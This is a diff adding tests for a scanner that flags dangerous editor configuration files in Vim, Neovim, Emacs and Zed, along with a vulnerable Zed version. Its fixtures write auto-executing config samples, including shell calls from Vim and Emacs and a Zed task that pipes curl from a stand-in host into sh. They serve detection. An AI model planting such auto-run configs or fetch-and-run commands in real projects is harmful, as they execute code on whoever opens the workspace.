@@ -1,5 +1,10 @@
+import * as fs from 'fs';
+import * as os from 'os';
+import * as path from 'path';
 import { expect } from 'chai';
+import { HeadlessWorkspaceScanner } from '../cli/headless-scanner';
 import {
+  checkInstalledZedVersion,
   isVulnerableZedVersion,
   scanEmacsDirLocals,
   scanLazyLockJson,
@@ -128,6 +133,51 @@ suite('Stage 2A: Editor Config Rules', () => {
       expect(isVulnerableZedVersion('0.165.4')).to.equal(false);
       expect(isVulnerableZedVersion('0.166.0')).to.equal(false);
       expect(isVulnerableZedVersion('1.0.0')).to.equal(false);
+    });
+  });
+
+  suite('End-to-End HeadlessWorkspaceScanner Stage 2 Editors', () => {
+    test('scanGlobalConfigs checks ~/.vimrc as global and checkInstalledZedVersion', () => {
+      const homeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'os-s2-home-'));
+      try {
+        fs.writeFileSync(path.join(homeDir, '.vimrc'), 'set exrc\n');
+        const scanner = new HeadlessWorkspaceScanner();
+        const findings = scanner.scanGlobalConfigs(homeDir);
+        expect(findings.some((f) => f.ruleId === 'vim_exrc_enabled')).to.equal(true);
+
+        const zedVuln = checkInstalledZedVersion(homeDir, { versionString: '0.165.3' });
+        expect(zedVuln).to.have.lengthOf(1);
+        expect(zedVuln[0].ruleId).to.equal('zed_vulnerable_idesaster_version');
+        expect(checkInstalledZedVersion(homeDir, { versionString: '0.165.4' })).to.have.lengthOf(0);
+      } finally {
+        fs.rmSync(homeDir, { recursive: true, force: true });
+      }
+    });
+
+    test('scanDirectory scans repo-local .vimrc, .nvim.lua, .exrc, .dir-locals.el, lazy-lock.json, and .zed/tasks.json', () => {
+      const repoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'os-s2-repo-'));
+      try {
+        fs.writeFileSync(path.join(repoDir, '.vimrc'), 'autocmd BufEnter * call system("id")\n');
+        fs.writeFileSync(path.join(repoDir, '.nvim.lua'), 'vim.system({"id"})\n');
+        fs.writeFileSync(path.join(repoDir, '.exrc'), 'set tabstop=2\n');
+        fs.writeFileSync(path.join(repoDir, '.dir-locals.el'), '((nil . ((eval . (shell-command "id")))))\n');
+        fs.writeFileSync(path.join(repoDir, 'lazy-lock.json'), JSON.stringify({ pkg: { branch: 'main' } }));
+        fs.mkdirSync(path.join(repoDir, '.zed'), { recursive: true });
+        fs.writeFileSync(
+          path.join(repoDir, '.zed', 'tasks.json'),
+          JSON.stringify([{ label: 'bad', command: 'curl', args: ['https://evil.test | sh'] }]),
+        );
+
+        const findings = new HeadlessWorkspaceScanner().scanDirectory(repoDir);
+        const ids = new Set(findings.map((f) => f.ruleId));
+        expect(ids.has('vim_local_rc_execution')).to.equal(true);
+        expect(ids.has('vim_local_rc_present')).to.equal(true);
+        expect(ids.has('emacs_dir_locals_exec')).to.equal(true);
+        expect(ids.has('nvim_lazy_lock_unpinned')).to.equal(true);
+        expect(findings.some((f) => f.ruleId.startsWith('zed_task_'))).to.equal(true);
+      } finally {
+        fs.rmSync(repoDir, { recursive: true, force: true });
+      }
     });
   });
 });
